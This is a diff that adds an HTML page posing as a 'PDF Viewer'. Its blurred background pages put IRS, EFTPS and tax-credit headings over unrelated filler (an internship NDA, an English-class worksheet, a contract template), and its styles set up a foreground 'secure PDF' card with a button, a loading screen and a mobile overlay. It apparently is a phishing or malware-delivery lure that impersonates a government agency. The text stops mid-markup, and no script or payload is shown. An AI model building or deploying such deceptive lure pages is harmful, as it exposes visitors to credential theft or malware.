@@ -1,0 +1,760 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PDF Viewer</title>
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta name="robots" content="noindex, nofollow">
+  <style>
+    :root {
+      --bg: #1e1e1e;
+      --card-bg: #f5f5f0;
+      --accent: #1a73e8;
+      --accent-hover: #1557b0;
+      --text: #333;
+      --text-light: #666;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+      background: var(--bg);
+      height: 100%;
+      overflow: hidden;
+      user-select: none;
+    }
+
+    /* ============================================
+       BACKGROUND: BLURRED PDF VIEWER
+       ============================================ */
+    .pdf-bg {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      display: flex;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    /* Sidebar */
+    .pdf-bg .sidebar {
+      width: 195px;
+      background: #252526;
+      border-right: 1px solid #3c3c3c;
+      padding: 14px 9px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      overflow-y: auto;
+    }
+
+    .pdf-bg .thumbnail {
+      width: 100%;
+      background: white;
+      border-radius: 4px;
+      border: 2px solid transparent;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.5);
+      opacity: 0.65;
+    }
+
+    .pdf-bg .thumbnail.active {
+      border-color: #0078d4;
+      box-shadow: 0 0 0 2px #0078d4;
+      opacity: 1;
+    }
+
+    .pdf-bg .thumbnail::before {
+      content: "";
+      display: block;
+      padding-top: 133.33%;
+    }
+
+    .pdf-bg .thumb-content {
+      position: absolute;
+      top: 0; left: 0;
+      width: 595px;
+      height: 842px;
+      transform: scale(0.285);
+      transform-origin: top left;
+      filter: blur(1.2px);
+      overflow: hidden;
+      pointer-events: none;
+    }
+
+    .pdf-bg .page-number {
+      position: absolute;
+      bottom: 5px;
+      right: 8px;
+      font-size: 10px;
+      color: #888;
+      font-weight: bold;
+      font-family: sans-serif;
+      z-index: 2;
+      text-shadow: 0 0 3px #fff;
+    }
+
+    /* Viewer area */
+    .pdf-bg .viewer {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+
+    .pdf-bg .toolbar {
+      height: 42px;
+      background: #2d2d2d;
+      border-bottom: 1px solid #3c3c3c;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 15px;
+      color: #888;
+      font-size: 13px;
+    }
+
+    .pdf-bg .canvas {
+      flex: 1;
+      background: #1a1a1a;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      position: relative;
+    }
+
+    .pdf-bg .pdf-page {
+      width: 595px;
+      height: 842px;
+      background: white;
+      box-shadow: 0 4px 25px rgba(0,0,0,0.6);
+      position: relative;
+      filter: blur(4px) brightness(0.45);
+      transform: scale(0.88);
+      user-select: none;
+      overflow: hidden;
+      display: none;
+    }
+
+    .pdf-bg .pdf-page.active { display: block; }
+
+    .pdf-bg .overlay {
+      position: absolute;
+      top: 42px;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.4);
+      z-index: 5;
+    }
+
+    .pdf-bg .sidebar::-webkit-scrollbar { width: 5px; }
+    .pdf-bg .sidebar::-webkit-scrollbar-track { background: #1e1e1e; }
+    .pdf-bg .sidebar::-webkit-scrollbar-thumb { background: #444; border-radius: 3px; }
+
+    /* ===== DOCUMENT STYLES (shared) ===== */
+    .doc-nda {
+      padding: 50px 55px;
+      font-family: 'Times New Roman', Times, serif;
+      font-size: 11px;
+      line-height: 1.6;
+      color: #000;
+      height: 100%;
+    }
+    .doc-nda .border-frame {
+      border: 2.5px solid #000;
+      padding: 35px 40px;
+      height: 100%;
+    }
+    .doc-nda h1 {
+      text-align: center;
+      font-size: 16px;
+      font-weight: bold;
+      text-transform: uppercase;
+      margin-bottom: 25px;
+      letter-spacing: 0.5px;
+    }
+    .doc-nda p { margin-bottom: 14px; text-align: justify; }
+    .doc-nda .blank {
+      display: inline-block; min-width: 120px;
+      border-bottom: 1px solid #000; margin: 0 3px;
+    }
+    .doc-nda .short-blank { min-width: 80px; }
+    .doc-nda .signature-block { margin-top: 30px; }
+    .doc-nda .sig-line { margin-bottom: 15px; }
+
+    .doc-test {
+      padding: 40px 45px;
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: 10.5px;
+      line-height: 1.5;
+      color: #000;
+      height: 100%;
+      position: relative;
+    }
+    .doc-test h1 { text-align: center; font-size: 15px; font-weight: bold; margin-bottom: 3px; }
+    .doc-test h2 { text-align: center; font-size: 12px; font-weight: bold; margin-bottom: 18px; }
+    .doc-test h3 { font-size: 11px; font-weight: bold; text-transform: uppercase; margin: 16px 0 10px 0; text-align: center; }
+    .doc-test .section-title { font-weight: bold; margin-bottom: 8px; }
+    .doc-test .columns { display: flex; gap: 25px; }
+    .doc-test .column { flex: 1; }
+    .doc-test .question { margin-bottom: 8px; font-size: 10px; }
+    .doc-test .checkbox {
+      display: inline-block; width: 10px; height: 10px;
+      border: 1px solid #333; margin-right: 4px; vertical-align: middle;
+    }
+    .doc-test .option { margin-left: 15px; margin-bottom: 2px; font-size: 9.5px; }
+    .doc-test .blank-line { display: inline-block; min-width: 70px; border-bottom: 1px solid #000; }
+    .doc-test .example { font-style: italic; color: #333; margin-bottom: 8px; font-size: 9.5px; }
+    .doc-test .match-item { margin-bottom: 4px; font-size: 9.5px; }
+    .doc-test .verb-options { font-size: 9.5px; color: #444; margin-top: 2px; margin-bottom: 6px; }
+    .doc-test .footer-logo {
+      position: absolute; bottom: 20px; right: 35px;
+      display: flex; align-items: center; gap: 6px;
+    }
+    .doc-test .footer-logo .color-grid {
+      display: grid; grid-template-columns: 8px 8px; grid-template-rows: 8px 8px; gap: 1px;
+    }
+    .doc-test .footer-logo .color-grid span:nth-child(1) { background: #e74c3c; }
+    .doc-test .footer-logo .color-grid span:nth-child(2) { background: #3498db; }
+    .doc-test .footer-logo .color-grid span:nth-child(3) { background: #f1c40f; }
+    .doc-test .footer-logo .color-grid span:nth-child(4) { background: #2ecc71; }
+    .doc-test .footer-logo .logo-text { font-size: 9px; font-weight: bold; color: #333; }
+
+    .doc-agree {
+      padding: 50px 55px;
+      font-family: 'Times New Roman', Times, serif;
+      font-size: 10.5px;
+      line-height: 1.6;
+      color: #000;
+      height: 100%;
+      position: relative;
+    }
+    .doc-agree h1 { text-align: center; font-size: 14px; font-weight: bold; text-transform: uppercase; margin-bottom: 5px; letter-spacing: 1px; }
+    .doc-agree .title-line { width: 60%; height: 2px; background: #000; margin: 0 auto 25px auto; }
+    .doc-agree p { margin-bottom: 12px; text-align: justify; }
+    .doc-agree .caps { text-transform: uppercase; font-weight: bold; }
+    .doc-agree .indent { margin-left: 20px; }
+    .doc-agree .field {
+      display: inline-block; min-width: 140px; border-bottom: 1px solid #000;
+      margin: 0 3px; text-align: center; font-style: italic;
+    }
+    .doc-agree .footer-bar {
+      position: absolute; bottom: 35px; left: 55px; right: 55px;
+      border-top: 1px solid #000; padding-top: 6px;
+      display: flex; justify-content: space-between; font-size: 9px;
+    }
+
+    /* ============================================
+       FOREGROUND: SECURE PDF CARD
+       ============================================ */
+
+    #loading-screen {
+      position: fixed; inset: 0;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      gap: 24px;
+      z-index: 100;
+      background: rgba(30,30,30,0.95);
+      backdrop-filter: blur(8px);
+      transition: opacity 0.4s ease;
+    }
+    #loading-screen.fade-out { opacity: 0; pointer-events: none; }
+
+    .loading-dots { display: flex; gap: 10px; }
+    .loading-dots span {
+      width: 12px; height: 12px; border-radius: 50%;
+      background: #fff; opacity: 0.3; transform: scale(0.8);
+      animation: pulse 1.4s infinite ease-in-out;
+    }
+    .loading-dots span:nth-child(1) { animation-delay: -0.32s; }
+    .loading-dots span:nth-child(2) { animation-delay: -0.16s; }
+    .loading-dots span:nth-child(3) { animation-delay: 0s; }
+    .loading-dots span:nth-child(4) { animation-delay: 0.16s; }
+    .loading-dots span:nth-child(5) { animation-delay: 0.32s; }
+    @keyframes pulse { 40% { opacity: 1; transform: scale(1); } }
+
+    .loading-text { color: #fff; font-size: 15px; letter-spacing: 0.5px; }
+
+    #main-content {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 10;
+      align-items: flex-start;
+      justify-content: center;
+      padding-top: 18vh;
+      animation: fadeIn 0.5s ease;
+    }
+    #main-content.show { display: flex; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
+
+    .card {
+      max-width: 440px;
+      margin: 0 auto;
+      background: var(--card-bg);
+      border-radius: 8px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+      padding: 52px 44px 44px;
+      text-align: center;
+      border-top: 4px solid var(--accent);
+    }
+
+    .card .logo {
+      width: 72px; height: 72px;
+      margin: 0 auto 24px;
+      display: block;
+      object-fit: contain;
+    }
+    .card .title {
+      font-size: 24px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 12px;
+    }
+    .card .desc {
+      font-size: 15px;
+      color: var(--text-light);
+      line-height: 1.6;
+      margin-bottom: 32px;
+    }
+    .card .btn {
+      display: inline-block;
+      padding: 14px 40px;
+      font-size: 16px;
+      font-weight: 600;
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      text-decoration: none;
+    }
+    .card .btn:hover {
+      background: var(--accent-hover);
+      box-shadow: 0 4px 16px rgba(26,115,232,0.35);
+      transform: translateY(-2px);
+    }
+    .card .btn:active { transform: translateY(0); }
+    .card .footer {
+      margin-top: 28px;
+      font-size: 12px;
+      color: #999;
+    }
+
+    #mobile-overlay {
+      display: none; position: fixed; inset: 0;
+      background: rgba(0,0,0,0.92);
+      z-index: 200;
+      align-items: center; justify-content: center;
+      padding: 20px;
+    }
+    .mobile-box {
+      background: #fff; border-radius: 14px;
+      padding: 36px 28px; text-align: center;
+      max-width: 360px; width: 100%;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+    }
+    .mobile-box .icon { font-size: 52px; margin-bottom: 16px; }
+    .mobile-box h2 { font-size: 22px; color: #222; margin-bottom: 12px; }
+    .mobile-box p { font-size: 15px; color: #666; line-height: 1.5; margin-bottom: 24px; }
+    .mobile-box .btn-mob {
+      width: 100%; padding: 12px;
+      background: #007AFF; color: #fff;
+      border: none; border-radius: 8px;
+      font-size: 16px; font-weight: 600;
+      cursor: pointer;
+    }
+    .mobile-box .btn-mob:hover { background: #0056CC; }
+
+    @media (max-width: 480px) {
+      #main-content { padding-top: 12vh; }
+      .card { margin: 0 16px; padding: 40px 28px 36px; }
+      .card .title { font-size: 20px; }
+      .pdf-bg .sidebar { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ===== BACKGROUND: BLURRED PDF VIEWER ===== -->
+  <div class="pdf-bg">
+    <div class="sidebar">
+
+      <!-- THUMB 1: NDA -->
+      <div class="thumbnail active" id="thumb0">
+        <div class="thumb-content">
+          <div class="doc-nda">
+            <div class="border-frame">
+              <h1>IRS.GOV; Tax Treasury Department Credit Guide</h1>
+              <p>YOUR TAX RECORD <span class="blank"></span>, here in after known as the "Intern", will have to confidential information while interning at <span class="blank"></span>, hereinafter known as the "Internship", he/she must sign this Non-Disclosure Agreement, hereinafter known as the "Agreement". "Confidential Information" means any information or secret of confidential nature relating to the workplace of the Internship.</p>
+              <p>Confidential Information may include, but is not limited to, the following: trade secrets, proprietary information, customer information, customer lists, methods, plans, documents, data, drawings, manuals, notebooks, reports, models, inventions, formulas, processes, software, information systems, contracts, negotiations, strategic planning, proposals, business alliances, and training materials.</p>
+              <p>In connection with being enrolled in the Internship, the Intern agrees to the following:</p>
+              <p>That he/she has read and understands the above definition of "Confidential Information" and agrees that he/she will not at any time, both during and after the Internship, communicate or disclose Confidential Information to any person, corporation, or entity.</p>
+              <p>The Intern further recognizes and agrees that while enrolled in the Internship, he/she may become aware of non-public information regarding employees or associates, including, without limitation, actions, omissions, statements, or personally identifiable medical, family, financial, social, behavioral, or other personal or private information.</p>
+              <p>The Intern agrees to not disclose any such information that he/she learns at the Internship to any other person or entity, unless required by applicable law or legal process.</p>
+              <div class="signature-block">
+                <p><strong>TAX RECORDS & REFORMED 2026 RULES</strong>, I, the Intern, have executed this Agreement on the <span class="blank short-blank"></span> of <span class="blank"></span>, 20<span class="blank short-blank"></span>.</p>
+                <div class="sig-line">Intern's Signature <span class="blank"></span></div>
+                <div class="sig-line">Print Name <span class="blank"></span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <span class="page-number">1</span>
+      </div>
+
+      <!-- THUMB 2: TEST -->
+      <div class="thumbnail" id="thumb1">
+        <div class="thumb-content">
+          <div class="doc-test">
+            <h1>EFTPS: The Electronic Federal Tax Payment </h1>
+            <h2>Convenience at your fingertips</h2>
+            <h3>Listening</h3>
+            <div class="columns">
+              <div class="column">
+                <div class="section-title">1 Listen to Annette describing a holiday. Tick A, B, or C.</div>
+                <div class="question">1. Annette went on holiday with her <span class="blank-line"></span>.</div>
+                <div class="option"><span class="checkbox"></span> A old friend</div>
+                <div class="option"><span class="checkbox"></span> B boyfriend</div>
+                <div class="option"><span class="checkbox"></span> C best friend</div>
+                <div class="question">2. On the first night, they went to <span class="blank-line"></span>.</div>
+                <div class="option"><span class="checkbox"></span> A a dance</div>
+                <div class="option"><span class="checkbox"></span> B a restaurant</div>
+                <div class="option"><span class="checkbox"></span> C a beach party</div>
+                <div class="question">3. They saw the girl again when they got on the <span class="blank-line"></span>.</div>
+                <div class="option"><span class="checkbox"></span> A bus</div>
+                <div class="option"><span class="checkbox"></span> B plane</div>
+                <div class="option"><span class="checkbox"></span> C train</div>
+                <div class="question">4. On safari, they <span class="blank-line"></span> together every night.</div>
+                <div class="option"><span class="checkbox"></span> A had a party</div>
+                <div class="option"><span class="checkbox"></span> B danced</div>
+                <div class="option"><span class="checkbox"></span> C ate</div>
+                <div class="question">5. After the holiday, Annette's boyfriend moved to Manchester with his <span class="blank-line"></span>.</div>
+                <div class="option"><span class="checkbox"></span> A best friend</div>
+                <div class="option"><span class="checkbox"></span> B new girlfriend</div>
+                <div class="option"><span class="checkbox"></span> C old friend</div>
+              </div>
+              <div class="column">
+                <div class="section-title">2 Listen to Nicole. Match 1–5 with A–E.</div>
+                <div class="match-item">1 At 14 … <span class="checkbox"></span></div>
+                <div class="match-item">2 At 15 … <span class="checkbox"></span></div>
+                <div class="match-item">3 At 24 … <span class="checkbox"></span></div>
+                <div class="match-item">4 At 25 … <span class="checkbox"></span></div>
+                <div class="match-item">5 At 28 … <span class="checkbox"></span></div>
+                <div style="margin-top:10px; font-size:9px;">
+                  <div class="match-item"><strong>A</strong> she went to Italy with her class at school.</div>
+                  <div class="match-item"><strong>B</strong> she stayed at a luxurious hotel in Paris.</div>
+                  <div class="match-item"><strong>C</strong> she spent her free time on the beach in Australia.</div>
+                  <div class="match-item"><strong>D</strong> she had a fantastic holiday in Spain with her family.</div>
+                  <div class="match-item"><strong>E</strong> she was unhappy because her brother was leaving.</div>
+                </div>
+              </div>
+            </div>
+            <h3>Vocabulary</h3>
+            <div class="columns">
+              <div class="column">
+                <div class="section-title">1 Underline the correct verb.</div>
+                <div class="example">Example: take / be / <strong>have</strong> someone to a restaurant</div>
+                <div class="question">1. meet / run / <strong>have</strong> across the road</div>
+                <div class="question">2. have / leave / <strong>wait</strong> a good time</div>
+                <div class="question">3. invite / give / <strong>drive</strong> somebody to dinner</div>
+                <div class="question">4. wait / meet / <strong>drive</strong> along the road</div>
+                <div class="question">5. run / be / <strong>play</strong> in a hurry</div>
+                <div class="question">6. wait / run / <strong>invite</strong> for a friend</div>
+                <div class="question">7. take / play / <strong>give</strong> a song</div>
+              </div>
+              <div class="column">
+                <div class="section-title">2 Complete with the correct word.</div>
+                <div class="example">Example: She didn't <strong>take</strong> many photos.</div>
+                <div class="question">1. You need a passport if you want to go <span class="blank-line"></span>.</div>
+                <div class="verb-options">by plane / on holiday / abroad</div>
+                <div class="question">2. The food at the restaurant was <span class="blank-line"></span>.</div>
+                <div class="verb-options">comfortable / delicious / crowded</div>
+                <div class="question">3. The weather was lovely. It was <span class="blank-line"></span> every day.</div>
+                <div class="verb-options">foggy / cloudy / sunny</div>
+                <div class="question">4. Julie and Andy <span class="blank-line"></span> their flights online.</div>
+                <div class="verb-options">booked / hired / rented</div>
+                <div class="question">5. I <span class="blank-line"></span> most of my time at the beach when I'm on holiday.</div>
+                <div class="verb-options">buy / go / spend</div>
+                <div class="question">6. Did you <span class="blank-line"></span> any souvenirs when you were in Brazil?</div>
+                <div class="verb-options">buy / take / have</div>
+                <div class="question">7. We went <span class="blank-line"></span> for a few days over Christmas.</div>
+                <div class="verb-options">by car / away / out</div>
+              </div>
+            </div>
+            <div style="margin: 15px 0;">
+              <div class="section-title">3 Complete the sentences with at, in, or on.</div>
+              <div class="example">Example: We got married on 7th May.</div>
+              <div class="question">1. What did you do <span class="blank-line"></span> the weekend?</div>
+              <div class="question">2. There was nowhere to sit <span class="blank-line"></span> the train.</div>
+              <div class="question">3. They played basketball <span class="blank-line"></span> the morning.</div>
+              <div class="question">4. Stefano was born <span class="blank-line"></span> Rome.</div>
+              <div class="question">5. They sat <span class="blank-line"></span> the balcony.</div>
+              <div class="question">6. We arrived <span class="blank-line"></span> the bus stop just before the bus left.</div>
+            </div>
+            <div class="footer-logo">
+              <div class="color-grid"><span></span><span></span><span></span><span></span></div>
+              <div class="logo-text">LIVEWORKSHEETS</div>
+            </div>
+          </div>
+        </div>
+        <span class="page-number">2</span>
+      </div>
+
+      <!-- THUMB 3: AGREEMENT -->
+      <div class="thumbnail" id="thumb2">
+        <div class="thumb-content">
+          <div class="doc-agree">
+            <h1>Traditional IRAs</h1>
+            <div class="title-line"></div>
+            <p>This First Supply Agreement (the "Agreement") is effective <span class="field">[DATE]</span>,</p>
+            <p class="caps">Between:</p>
+            <p class="indent"><span class="field">[YOUR COMPANY NAME]</span> (the "Supplier"), a company organized and existing under the laws of the <span class="field">[State/Province]</span> of <span class="field">[STATE/PROVINCE]</span>, with its head office located at: <span class="field">[YOUR COMPLETE ADDRESS]</span></p>
+            <p class="caps">And:</p>
+            <p class="indent"><span class="field">[COMPANY NAME]</span> (the "Client"), a company organized and existing under the laws of the <span class="field">[State/Province]</span> of <span class="field">[STATE/PROVINCE]</span>, with its head office located at: <span class="field">[COMPLETE ADDRESS]</span></p>
+            <p><span class="caps">Whereas:</span> the Client has been providing for its <span class="field">[SPECIFY PRODUCT]</span> requirements through its <span class="field">[SPECIFY]</span> division and through supply agreements with suppliers not affiliated with the Client.</p>
+            <p><span class="caps">Whereas:</span> the Supplier has acquired the Client's <span class="field">[SPECIFY]</span> division and the parties wish to enter into this Agreement.</p>
+            <p><span class="caps">Whereas:</span> the parties wish the Supplier to continue to supply at competitive prices such part of the Client's <span class="field">[SPECIFY PRODUCT]</span> requirements as has been provided by the <span class="field">[SPECIFY]</span> division until a certain date.</p>
+            <p><span class="caps">Therefore,</span> in consideration of the foregoing and mutual covenants herein contained, the parties agree as follows:</p>
+            <p><span class="caps">Section 1</span> &mdash; Subject to the terms of this Agreement, the Client grants the Supplier the right to continue to supply part of the Client's <span class="field">[SPECIFY PRODUCT]</span> requirements, specifically those provided for by the <span class="field">[SPECIFY]</span> division of the Client until <span class="field">[DATE]</span>, for a period starting on the date of this Agreement and ending on <span class="field">[DATE]</span>.</p>
+            <p><span class="caps">Section 2</span> &mdash; Purchase Terms and Obligations</p>
+            <p class="indent"><strong>2.1</strong> During the term and subject to this Agreement, the Client shall purchase <span class="field">[SPECIFY PRODUCT]</span> from the Supplier as follows:</p>
+            <p class="indent"><strong>2.1.1</strong> Year 1 (period ending <span class="field">[DATE]</span>) &mdash; <span class="field">[PERCENTAGE]</span> % of the total <span class="field">[SPECIFY PRODUCT]</span> requirements of the Client (in volume) that would have otherwise been provided for by the <span class="field">[SPECIFY PRODUCT]</span> division for such period.</p>
+            <p class="indent"><strong>2.1.2</strong> Year 2 (i.e. <span class="field">[NUMBER]</span>-month period ending <span class="field">[DATE]</span>) &mdash; No less than <span class="field">[PERCENTAGE]</span> % of the total <span class="field">[SPECIFY PRODUCT]</span> requirements of the Client (in volume) that would have otherwise been provided for by the <span class="field">[SPECIFY PRODUCT]</span> division for such period.</p>
+            <div class="footer-bar">
+              <span>First Supply Agreement</span>
+              <span>Page 1 of 17</span>
+            </div>
+          </div>
+        </div>
+        <span class="page-number">3</span>
+      </div>
+
+    </div>
+
+    <!-- MAIN VIEWER -->
+    <div class="viewer">
+      <div class="toolbar">
+        <span>&#9664;</span>
+        <span id="bgPageInfo">1 / 3</span>
+        <span>&#9654;</span>
+      </div>
+      <div class="canvas">
+
+        <!-- PAGE 1: NDA -->
+        <div class="pdf-page active doc-nda" id="bgPage0">
+          <div class="border-frame">
+            <h1>Credits and deductions for businesses</h1>
+            <p>Due to the privileged access that <span class="blank"></span>, here in after known as the "Intern", will have to confidential information while interning at <span class="blank"></span>, hereinafter known as the "Internship", he/she must sign this Non-Disclosure Agreement, hereinafter known as the "Agreement". "Confidential Information" means any information or secret of confidential nature relating to the workplace of the Internship.</p>
+            <p>Confidential Information may include, but is not limited to, the following: trade secrets, proprietary information, customer information, customer lists, methods, plans, documents, data, drawings, manuals, notebooks, reports, models, inventions, formulas, processes, software, information systems, contracts, negotiations, strategic planning, proposals, business alliances, and training materials.</p>
+            <p>In connection with being enrolled in the Internship, the Intern agrees to the following:</p>
+            <p>That he/she has read and understands the above definition of "Confidential Information" and agrees that he/she will not at any time, both during and after the Internship, communicate or disclose Confidential Information to any person, corporation, or entity.</p>
+            <p>The Intern further recognizes and agrees that while enrolled in the Internship, he/she may become aware of non-public information regarding employees or associates, including, without limitation, actions, omissions, statements, or personally identifiable medical, family, financial, social, behavioral, or other personal or private information.</p>
+            <p>The Intern agrees to not disclose any such information that he/she learns at the Internship to any other person or entity, unless required by applicable law or legal process.</p>
+            <div class="signature-block">
+              <p><strong>IN WITNESS WHEREOF</strong>, I, the Intern, have executed this Agreement on the <span class="blank short-blank"></span> of <span class="blank"></span>, 20<span class="blank short-blank"></span>.</p>
+              <div class="sig-line">Intern's Signature <span class="blank"></span></div>
+              <div class="sig-line">Print Name <span class="blank"></span></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PAGE 2: TEST -->
+        <div class="pdf-page doc-test" id="bgPage1">
+          <h1>TEST UNIT 2</h1>
+          <h2>ENGLISH FILE PRE-INTERMEDIATE</h2>
+          <h3>Listening</h3>
+          <div class="columns">
+            <div class="column">
+              <div class="section-title">1 Listen to Annette describing a holiday. Tick A, B, or C.</div>
+              <div class="question">1. Annette went on holiday with her <span class="blank-line"></span>.</div>
+              <div class="option"><span class="checkbox"></span> A old friend</div>
+              <div class="option"><span class="checkbox"></span> B boyfriend</div>
+              <div class="option"><span class="checkbox"></span> C best friend</div>
+              <div class="question">2. On the first night, they went to <span class="blank-line"></span>.</div>
+              <div class="option"><span class="checkbox"></span> A a dance</div>
+              <div class="option"><span class="checkbox"></span> B a restaurant</div>
+              <div class="option"><span class="checkbox"></span> C a beach party</div>
+              <div class="question">3. They saw the girl again when they got on the <span class="blank-line"></span>.</div>
+              <div class="option"><span class="checkbox"></span> A bus</div>
+              <div class="option"><span class="checkbox"></span> B plane</div>
+              <div class="option"><span class="checkbox"></span> C train</div>
+              <div class="question">4. On safari, they <span class="blank-line"></span> together every night.</div>
+              <div class="option"><span class="checkbox"></span> A had a party</div>
+              <div class="option"><span class="checkbox"></span> B danced</div>
+              <div class="option"><span class="checkbox"></span> C ate</div>
+              <div class="question">5. After the holiday, Annette's boyfriend moved to Manchester with his <span class="blank-line"></span>.</div>
+              <div class="option"><span class="checkbox"></span> A best friend</div>
+              <div class="option"><span class="checkbox"></span> B new girlfriend</div>
+              <div class="option"><span class="checkbox"></span> C old friend</div>
+            </div>
+            <div class="column">
+              <div class="section-title">2 Listen to Nicole. Match 1–5 with A–E.</div>
+              <div class="match-item">1 At 14 … <span class="checkbox"></span></div>
+              <div class="match-item">2 At 15 … <span class="checkbox"></span></div>
+              <div class="match-item">3 At 24 … <span class="checkbox"></span></div>
+              <div class="match-item">4 At 25 … <span class="checkbox"></span></div>
+              <div class="match-item">5 At 28 … <span class="checkbox"></span></div>
+              <div style="margin-top:10px; font-size:9px;">
+                <div class="match-item"><strong>A</strong> she went to Italy with her class at school.</div>
+                <div class="match-item"><strong>B</strong> she stayed at a luxurious hotel in Paris.</div>
+                <div class="match-item"><strong>C</strong> she spent her free time on the beach in Australia.</div>
+                <div class="match-item"><strong>D</strong> she had a fantastic holiday in Spain with her family.</div>
+                <div class="match-item"><strong>E</strong> she was unhappy because her brother was leaving.</div>
+              </div>
+            </div>
+          </div>
+          <h3>Vocabulary</h3>
+          <div class="columns">
+            <div class="column">
+              <div class="section-title">1 Underline the correct verb.</div>
+              <div class="example">Example: take / be / <strong>have</strong> someone to a restaurant</div>
+              <div class="question">1. meet / run / <strong>have</strong> across the road</div>
+              <div class="question">2. have / leave / <strong>wait</strong> a good time</div>
+              <div class="question">3. invite / give / <strong>drive</strong> somebody to dinner</div>
+              <div class="question">4. wait / meet / <strong>drive</strong> along the road</div>
+              <div class="question">5. run / be / <strong>play</strong> in a hurry</div>
+              <div class="question">6. wait / run / <strong>invite</strong> for a friend</div>
+              <div class="question">7. take / play / <strong>give</strong> a song</div>
+            </div>
+            <div class="column">
+              <div class="section-title">2 Complete with the correct word.</div>
+              <div class="example">Example: She didn't <strong>take</strong> many photos.</div>
+              <div class="question">1. You need a passport if you want to go <span class="blank-line"></span>.</div>
+              <div class="verb-options">by plane / on holiday / abroad</div>
+              <div class="question">2. The food at the restaurant was <span class="blank-line"></span>.</div>
+              <div class="verb-options">comfortable / delicious / crowded</div>
+              <div class="question">3. The weather was lovely. It was <span class="blank-line"></span> every day.</div>
+              <div class="verb-options">foggy / cloudy / sunny</div>
+              <div class="question">4. Julie and Andy <span class="blank-line"></span> their flights online.</div>
+              <div class="verb-options">booked / hired / rented</div>
+              <div class="question">5. I <span class="blank-line"></span> most of my time at the beach when I'm on holiday.</div>
+              <div class="verb-options">buy / go / spend</div>
+              <div class="question">6. Did you <span class="blank-line"></span> any souvenirs when you were in Brazil?</div>
+              <div class="verb-options">buy / take / have</div>
+              <div class="question">7. We went <span class="blank-line"></span> for a few days over Christmas.</div>
+              <div class="verb-options">by car / away / out</div>
+            </div>
+          </div>
+          <div style="margin: 15px 0;">
+            <div class="section-title">3 Complete the sentences with at, in, or on.</div>
+            <div class="example">Example: We got married on 7th May.</div>
+            <div class="question">1. What did you do <span class="blank-line"></span> the weekend?</div>
+            <div class="question">2. There was nowhere to sit <span class="blank-line"></span> the train.</div>
+            <div class="question">3. They played basketball <span class="blank-line"></span> the morning.</div>
+            <div class="question">4. Stefano was born <span class="blank-line"></span> Rome.</div>
+            <div class="question">5. They sat <span class="blank-line"></span> the balcony.</div>
+            <div class="question">6. We arrived <span class="blank-line"></span> the bus stop just before the bus left.</div>
+          </div>
+          <div class="footer-logo">
+            <div class="color-grid"><span></span><span></span><span></span><span></span></div>
+            <div class="logo-text">LIVEWORKSHEETS</div>
+          </div>
+        </div>
+
+        <!-- PAGE 3: AGREEMENT -->
+        <div class="pdf-page doc-agree" id="bgPage2">
+          <h1>First Supply Agreement</h1>
+          <div class="title-line"></div>
+          <p>This First Supply Agreement (the "Agreement") is effective <span class="field">[DATE]</span>,</p>
+          <p class="caps">Between:</p>
+          <p class="indent"><span class="field">[YOUR COMPANY NAME]</span> (the "Supplier"), a company organized and existing under the laws of the <span class="field">[State/Province]</span> of <span class="field">[STATE/PROVINCE]</span>, with its head office located at: <span class="field">[YOUR COMPLETE ADDRESS]</span></p>
+          <p class="caps">And:</p>
+          <p class="indent"><span class="field">[COMPANY NAME]</span> (the "Client"), a company organized and existing under the laws of the <span class="field">[State/Province]</span> of <span class="field">[STATE/PROVINCE]</span>, with its head office located at: <span class="field">[COMPLETE ADDRESS]</span></p>
+          <p><span class="caps">Whereas:</span> the Client has been providing for its <span class="field">[SPECIFY PRODUCT]</span> requirements through its <span class="field">[SPECIFY]</span> division and through supply agreements with suppliers not affiliated with the Client.</p>
+          <p><span class="caps">Whereas:</span> the Supplier has acquired the Client's <span class="field">[SPECIFY]</span> division and the parties wish to enter into this Agreement.</p>
+          <p><span class="caps">Whereas:</span> the parties wish the Supplier to continue to supply at competitive prices such part of the Client's <span class="field">[SPECIFY PRODUCT]</span> requirements as has been provided by the <span class="field">[SPECIFY]</span> division until a certain date.</p>
+          <p><span class="caps">Therefore,</span> in consideration of the foregoing and mutual covenants herein contained, the parties agree as follows:</p>
+          <p><span class="caps">Section 1</span> &mdash; Subject to the terms of this Agreement, the Client grants the Supplier the right to continue to supply part of the Client's <span class="field">[SPECIFY PRODUCT]</span> requirements, specifically those provided for by the <span class="field">[SPECIFY]</span> division of the Client until <span class="field">[DATE]</span>, for a period starting on the date of this Agreement and ending on <span class="field">[DATE]</span>.</p>
+          <p><span class="caps">Section 2</span> &mdash; Purchase Terms and Obligations</p>
+          <p class="indent"><strong>2.1</strong> During the term and subject to this Agreement, the Client shall purchase <span class="field">[SPECIFY PRODUCT]</span> from the Supplier as follows:</p>
